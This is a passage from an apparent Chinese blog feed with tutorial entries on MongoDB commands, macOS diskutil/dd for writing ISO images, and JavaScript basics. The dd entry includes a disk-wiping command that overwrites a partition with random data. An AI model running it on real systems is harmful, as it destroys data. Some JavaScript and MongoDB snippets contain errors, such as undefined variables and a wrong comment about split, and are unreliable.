class="number">30</span>)      //暂停<span class="number">30</span>s不参与选举</span><br><span class="line">rs.stepDown(<span class="number">60</span>,<span class="number">30</span>)   //交出主节点位置，维持从节点状态不少于<span class="number">60</span>秒，等待<span class="number">30</span>秒使主节点和从节点日志同步</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mongodb集群入门——副本集，主要功能故障转移</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/categories/Linux/MongoDB/"/>
    
    <category term="命令" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="高级功能" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/%E9%AB%98%E7%BA%A7%E5%8A%9F%E8%83%BD/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Services" scheme="https://www.scery.com/tags/Services/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB总结</title>
    <link href="https://www.scery.com/MongoDB%E6%80%BB%E7%BB%93.htm"/>
    <id>https://www.scery.com/MongoDB%E6%80%BB%E7%BB%93.htm</id>
    <published>2020-07-29T13:50:16.000Z</published>
    <updated>2024-03-18T02:51:00.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB总结"><a href="#MongoDB总结" class="headerlink" title="MongoDB总结"></a>MongoDB总结</h1><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> databasename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.dropDatabase();</span><br><span class="line"></span><br><span class="line">show collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.createCollection(&#x27;collectionname&#x27;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">db</span>.collectionname.<span class="keyword">drop</span>();</span><br></pre></td></tr></table></figure><h3 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h3><h4 id="增："><a href="#增：" class="headerlink" title="增："></a>增：</h4><p>集合存在则直接插入数据，不存在则隐式创建</p><p>collections为集合名</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)<span class="comment">//单个JSON插入</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(<span class="selector-attr">[&#123;name:<span class="string">&quot;jack&quot;</span>&#125;.&#123;name:<span class="string">&quot;tom&quot;</span>&#125;]</span>)<span class="comment">//多个JSON插入</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i =<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span></span>&#123;</span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.insert</span>(&#123;name:<span class="string">&quot;jack&quot;</span>&#125;)</span><br><span class="line">&#125;<span class="comment">//快速插入多个数据</span></span><br></pre></td></tr></table></figure><h4 id="改"><a href="#改" class="headerlink" title="改:"></a>改:</h4><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(条件,新数据[,是否新增,是否修改多条数据])</span><br><span class="line">//是否新增<span class="built_in">：true</span>则为插入，默认flase为不插入</span><br><span class="line">//是否修改多条：匹配到的数据都修改，默<span class="built_in">认true</span>为是<span class="built_in">，false</span>为否</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;<span class="built_in">,false</span><span class="built_in">,true</span>)</span><br><span class="line">//这样子为将tom的那条数据替换成<span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;，默认为替换不是修改</span><br></pre></td></tr></table></figure><p><strong>下面运算符可在新数据里面使用</strong></p><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>$inc</td><td>递增</td></tr><tr><td>$rename</td><td>重命名列</td></tr><tr><td>$set</td><td>修改列值</td></tr><tr><td>$unset</td><td>删除列</td></tr></tbody></table><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$inc</span>使用，将age增加<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: <span class="number">3</span>&#125;&#125;)</span><br><span class="line">//<span class="variable">$inc</span>使用，将age减少<span class="number">3</span></span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$inc:</span>&#123;age: -<span class="number">3</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$rename</span>使用，修<span class="built_in">改name</span>命名为uname</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$rename:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;uname&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$set</span>使用，将修<span class="built_in">改name</span>为saily</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$set:</span><span class="built_in">&#123;name</span>:<span class="string">&quot;saily&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">//<span class="variable">$unset</span>使用，将age字段删除<span class="built_in">,true</span>为删除</span><br><span class="line">db<span class="built_in">.collection</span>.<span class="keyword">update</span>(<span class="built_in">&#123;name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;<span class="variable">$unset:</span>&#123;age:true&#125;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一次性写多个修改器</span></span><br><span class="line">db.collection.<span class="title function_ invoke__">update</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;</span><br><span class="line"><span class="variable">$inc</span>:&#123;<span class="attr">age</span>: <span class="number">3</span>&#125;,</span><br><span class="line"><span class="variable">$set</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;saily&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$rename</span>:&#123;<span class="attr">name</span>:<span class="string">&quot;uname&quot;</span>&#125;,</span><br><span class="line"><span class="variable">$unset</span>:&#123;<span class="attr">age</span>:<span class="literal">true</span>&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h4><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">db.collection.<span class="built_in">find</span>(条件[,查询的列])</span><br><span class="line"><span class="comment">//格式化查询文档</span></span><br><span class="line">db.collection.<span class="built_in">find</span>().pretty();</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询age为6和sex为male的数据</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;age:<span class="number">6</span>,sex:<span class="string">&quot;male&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询的列 表示 结果筛选</span></span><br><span class="line"><span class="comment">//查询name为tom只显示age字段</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询name为tom除了age字段都显示</span></span><br><span class="line">db.collection.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;,&#123;age:<span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure><h4 id="删："><a href="#删：" class="headerlink" title="删："></a>删：</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(条件<span class="selector-attr">[,是否删除一条]</span>)</span><br><span class="line"><span class="comment">//删除集合中所有文档</span></span><br><span class="line">db<span class="selector-class">.collection</span><span class="selector-class">.remove</span>(&#123;&#125;)</span><br><span class="line"><span class="comment">//是否删除一条，只删除一条为true，默认为否删除全部false</span></span><br></pre></td></tr></table></figure><h3 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JSON数据里面根据键值排序，键为字段名，值为1则升序排序，值为-1则为降序排序</span></span><br><span class="line"><span class="keyword">db</span>.collectionname.find().<span class="keyword">sort</span>(JSON数据)</span><br><span class="line"></span><br><span class="line"><span class="comment">//年龄按降序排序</span></span><br><span class="line"><span class="keyword">db</span>.<span class="keyword">test</span>.find().<span class="keyword">sort</span>(&#123;age: -1&#125;);</span><br></pre></td></tr></table></figure><h3 id="Limit与Skip方法："><a href="#Limit与Skip方法：" class="headerlink" title="Limit与Skip方法："></a>Limit与Skip方法：</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>()<span class="selector-class">.skip</span>(数字)<span class="selector-class">.limit</span>(数字);</span><br><span class="line"><span class="comment">//skip跳过指定数量文档（可选），limit限制查询的数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//降序查询2条而且跳过2条数据</span></span><br><span class="line">db<span class="selector-class">.test</span><span class="selector-class">.find</span>()<span class="selector-class">.sort</span>(&#123;age:-<span class="number">1</span>&#125;)<span class="selector-class">.skip</span>(<span class="number">2</span>)<span class="selector-class">.limit</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h3 id="聚合查询："><a href="#聚合查询：" class="headerlink" title="聚合查询："></a>聚合查询：</h3><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">db.collectionname.aggregate([</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;管道:&#123;表达式&#125;</span><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">...</span></span><br><span class="line"><span class="language-xml">])</span></span><br></pre></td></tr></table></figure><p><strong>常用管道</strong></p><table><thead><tr><th>方法</th><th>作用</th></tr></thead><tbody><tr><td>$group</td><td>将集合中的文档分组，用于统计结果</td></tr><tr><td>$match</td><td>过滤数据，只要输出符合条件的文档</td></tr><tr><td>$sort​</td><td>聚合数据进一步排序</td></tr><tr><td>$skip</td><td>跳过指定的文档数</td></tr><tr><td>$limit</td><td>限制集合数据返回文档数</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p><strong>常用表达式</strong></p><table><thead><tr><th align="left">方法</th><th>作用</th><th>用法</th></tr></thead><tbody><tr><td align="left">$sum</td><td>总和</td><td>$sum:1 同count表示统计</td></tr><tr><td align="left">$avg</td><td>平均</td><td></td></tr><tr><td align="left">$min</td><td>最小值</td><td></td></tr><tr><td align="left">$max</td><td>最大值</td><td></td></tr><tr><td align="left">…</td><td>…</td><td>…</td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>统计sex的总人数</span><br><span class="line">db.test.aggregate([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line">_id: <span class="string">&quot;$sex&quot;</span>,<span class="regexp">//</span>按照sex列的顺序分组</span><br><span class="line">rs:  &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;<span class="regexp">//</span>rs为统计总和的结果</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//统计所有人数的平均年龄</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;<span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="literal">null</span>,</span><br><span class="line"><span class="attr">totalNum</span>:  &#123;<span class="variable">$sum</span>: <span class="number">1</span>&#125;,</span><br><span class="line"><span class="attr">avgAge</span>: &#123;<span class="variable">$avg</span>: <span class="string">&quot;<span class="subst">$age</span>&quot;</span>&#125;</span><br><span class="line">&#125;&#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查询每个sex的人数，按人数升序排序</span></span><br><span class="line">db.test.<span class="title function_ invoke__">aggregate</span>([</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$group</span>:&#123;</span><br><span class="line"><span class="attr">_id</span>: <span class="string">&quot;<span class="subst">$sex</span>&quot;</span>,</span><br><span class="line"><span class="attr">totalNum</span>: &#123;<span class="variable">$sum</span>:<span class="number">1</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="variable">$sort</span>:&#123;<span class="attr">totalNum</span>:<span class="number">1</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">])</span><br></pre></td></tr></table></figure><h3 id="索引："><a href="#索引：" class="headerlink" title="索引："></a>索引：</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.createIndex</span>(待创建索引的列<span class="selector-attr">[,额外选项]</span>)</span><br><span class="line"><span class="comment">//待创建索引的列： &#123;键:1,...,键:-1&#125; 1为按升序创建索引，-1位按降序创建索引</span></span><br><span class="line"><span class="comment">//额外选项：设置索引的名称或者唯一索引等 &#123;name:indexname,unique:列名&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除索引语法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//全部删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndexes</span>()</span><br><span class="line"><span class="comment">//部分删除</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.dropIndex</span>(<span class="string">&#x27;索引名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看索引语法</span></span><br><span class="line">db<span class="selector-class">.collectionname</span><span class="selector-class">.getIndexes</span>()</span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建多个索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1,<span class="params">age</span>:1&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建唯一索引</span></span><br><span class="line">db.collectionname.create<span class="constructor">Index(&#123;<span class="params">name</span>:1&#125;,&#123;<span class="params">unique</span>:<span class="params">age</span>&#125;)</span></span><br></pre></td></tr></table></figure><h3 id="分析索引："><a href="#分析索引：" class="headerlink" title="分析索引："></a>分析索引：</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">db.collectionname.find().explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>COLLSCAN 全表扫描</span><br><span class="line"><span class="regexp">//</span>IXSCAN 索引扫描</span><br><span class="line"><span class="regexp">//</span>FETCH 根据索引去检索指定的document</span><br></pre></td></tr></table></figure><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/IMG_0512-6029409.jpg" alt="IMG_0512"></p><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="comment">//未添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br><span class="line"><span class="comment">//添加索引寻找</span></span><br><span class="line">db.test.<span class="built_in">find</span>(&#123;<span class="built_in">name</span>:<span class="string">&quot;tom&quot;</span>&#125;).explain(<span class="string">&#x27;executionStats&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="权限机制："><a href="#权限机制：" class="headerlink" title="权限机制："></a>权限机制：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">admin</span>;</span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;huangjiahui&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;huangjiahui&quot;</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;)；</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;</span><br><span class="line"><span class="string">&quot;user&quot;</span>: <span class="string">&quot;账号&quot;</span>,</span><br><span class="line"><span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;密码&quot;</span>,</span><br><span class="line"><span class="attr">roles</span>:[&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;角色&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;所属数据库&quot;</span></span><br><span class="line">&#125;,&#123;</span><br><span class="line"><span class="attr">role</span>: <span class="string">&quot;readWrite&quot;</span>,</span><br><span class="line">  <span class="attr">db</span>:<span class="string">&quot;zdnfcj&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line">]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定某个数据库创建用户，要到当下的数据库下创建用户</span></span><br><span class="line"><span class="comment">//admin下的system.users集合能看到所有用户</span></span><br></pre></td></tr></table></figure><blockquote><p>#角色种类</p><p>超级用户角色：root</p><p>数据库用户角色：read、readWrite</p><p>数据库管理角色：dbAdmin、userAdmin</p><p>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager</p><p>备份恢复角色：backup、restore</p><p>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</p></blockquote><p><strong>通过root登录</strong></p><ul><li>mongo ip:port/database -u user -p pwd</li><li>先登录 mongo，选择admin数据库，db.auth(user,pwd)</li></ul><h3 id="备份还原"><a href="#备份还原" class="headerlink" title="备份还原:"></a>备份还原:</h3><p><strong>备份</strong></p><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">mongodump -h -port -u -p -d -o</span><br><span class="line"></span><br><span class="line">//语法说明</span><br><span class="line"><span class="deletion">-hhost ip</span></span><br><span class="line"><span class="deletion">-portport</span></span><br><span class="line"><span class="deletion">-uuser</span></span><br><span class="line"><span class="deletion">-ppwd</span></span><br><span class="line"><span class="deletion">-ddatabase</span></span><br><span class="line"><span class="deletion">-oopen./xxx/备份路径文件夹</span></span><br></pre></td></tr></table></figure><p><strong>还原</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mongorestore -h -port -u -<span class="selector-tag">p</span> -d <span class="attr">--drop</span> 备份数据目录</span><br><span class="line"></span><br><span class="line">-d 不写则还原全部数据</span><br><span class="line"><span class="attr">--drop</span>  先删除数据库再导入</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Mongodb命令总结，避免遗忘。</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/categories/Linux/MongoDB/"/>
    
    <category term="命令" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="使用" scheme="https://www.scery.com/categories/Linux/MongoDB/%E5%91%BD%E4%BB%A4/%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Services" scheme="https://www.scery.com/tags/Services/"/>
    
    <category term="MongoDB" scheme="https://www.scery.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>Diskutil工具集使用</title>
    <link href="https://www.scery.com/diskutil.htm"/>
    <id>https://www.scery.com/diskutil.htm</id>
    <published>2020-06-06T11:20:20.000Z</published>
    <updated>2024-03-18T02:51:00.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Diskutil"><a href="#Diskutil" class="headerlink" title="Diskutil"></a>Diskutil</h1><p>在Mac OS系统下不需要安装任何第三方软件，可以很方便地用自带的dd命令将iso镜像写入u盘。</p><p>操作如下：</p><p>1、找出U盘挂载的路径，使用如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil list</span><br></pre></td></tr></table></figure><p>2、将U盘unmount（将N替换为挂载路径）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">diskutil unmount Disk /dev/disk[N]</span><br></pre></td></tr></table></figure><p>3、写入U盘：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=iso路径 of=/dev/rdisk[N] bs=1m  </span><br></pre></td></tr></table></figure><p>rdisk 中加入r可以让写入速度加快</p><h3 id="将u盘备份到iso镜像"><a href="#将u盘备份到iso镜像" class="headerlink" title="将u盘备份到iso镜像"></a>将u盘备份到iso镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/rdisk[N] of= iso路径 bs=1m</span><br></pre></td></tr></table></figure><p>除此之外，dd命令还有以下作用：</p><h3 id="销毁磁盘数据"><a href="#销毁磁盘数据" class="headerlink" title="销毁磁盘数据"></a>销毁磁盘数据</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/urandom of=/dev/hda1</span><br></pre></td></tr></table></figure><p>注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。</p><h3 id="测试硬盘的读写速度"><a href="#测试硬盘的读写速度" class="headerlink" title="测试硬盘的读写速度"></a>测试硬盘的读写速度</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/root/1Gb.file bs=64k | <span class="built_in">dd</span> of=/dev/null</span><br></pre></td></tr></table></figure><p>通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。</p>]]></content>
    
    
    <summary type="html">Macos写入iso镜像到移动设备</summary>
    
    
    
    <category term="MacOs" scheme="https://www.scery.com/categories/MacOs/"/>
    
    <category term="Service" scheme="https://www.scery.com/categories/MacOs/Service/"/>
    
    <category term="Diskutil" scheme="https://www.scery.com/categories/MacOs/Service/Diskutil/"/>
    
    
    <category term="Service" scheme="https://www.scery.com/tags/Service/"/>
    
    <category term="MacOs" scheme="https://www.scery.com/tags/MacOs/"/>
    
    <category term="Diskutil" scheme="https://www.scery.com/tags/Diskutil/"/>
    
  </entry>
  
  <entry>
    <title>javascript-data_tructures_and_algorithms</title>
    <link href="https://www.scery.com/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm"/>
    <id>https://www.scery.com/JavaScript%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E6%8F%8F%E8%BF%B0.htm</id>
    <published>2020-06-05T02:57:28.000Z</published>
    <updated>2024-03-18T02:51:00.705Z</updated>
    
    <content type="html"><![CDATA[<h1 id="data-tructures-and-algorithms-for-JavaScript"><a href="#data-tructures-and-algorithms-for-JavaScript" class="headerlink" title="data tructures and algorithms for JavaScript"></a>data tructures and algorithms for JavaScript</h1><h4 id="arithmetic-operation"><a href="#arithmetic-operation" class="headerlink" title="arithmetic operation"></a>arithmetic operation</h4><p>精度问题：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>+<span class="number">1.1</span>)<span class="comment">//输出4.1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>*<span class="number">1.1</span>)<span class="comment">//输出3.3000000000000003</span></span><br></pre></td></tr></table></figure><p>如果计算精度不必像上面那样精确，可以格式化为固定精度：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">print</span>((<span class="number">3</span>*<span class="number">1.1</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>))<span class="comment">//显示3.30</span></span><br></pre></td></tr></table></figure><h4 id="OOP-object-oriented-programming"><a href="#OOP-object-oriented-programming" class="headerlink" title="OOP (object-oriented programming)"></a>OOP (object-oriented programming)</h4><p>构建一个检查银行账户对象的构造函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Checking</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> = balance;<span class="comment">//属性</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">deposit</span> = deposite; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">withdraw</span> = withdraw; <span class="comment">//方法</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">toString</span> = toString; <span class="comment">//方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>this关键字用来将方法和属性绑定到一个对象的实例上</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">balance</span> += amount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">amount</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">balance</span>&lt;amount)&#123;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;Insufficient funds&quot;</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">balance</span> -= amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Balance:&quot;</span>+ <span class="variable language_">this</span>.<span class="property">balance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法的互相引用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bank = <span class="keyword">new</span> <span class="title class_">Checking</span>(<span class="number">500</span>);</span><br><span class="line">bank.<span class="title function_">deposit</span>(<span class="number">100</span>);</span><br><span class="line">bank.<span class="title function_">withdraw</span>(<span class="number">400</span>);</span><br></pre></td></tr></table></figure><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><p>调用方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">let</span> arr1 = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);<span class="comment">//定义长度</span></span><br></pre></td></tr></table></figure><p><u>字符串</u>生成<u>数组</u>：</p><p><strong>split()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&quot;A is a cat&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> arr = str.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>);<span class="comment">//根据空格分隔产生数组</span></span><br></pre></td></tr></table></figure><p><strong>浅复制</strong>和<strong>深复制</strong>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr1 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> arr2 = arr1;</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr2[<span class="number">0</span>]);<span class="comment">//输出100</span></span><br></pre></td></tr></table></figure><p><u>这种行为就叫做<strong>浅复制</strong>，新数组依然指向原来的数组，如果需要改变新数组的值，则需要使用<strong>深复制</strong>的方案</u></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span 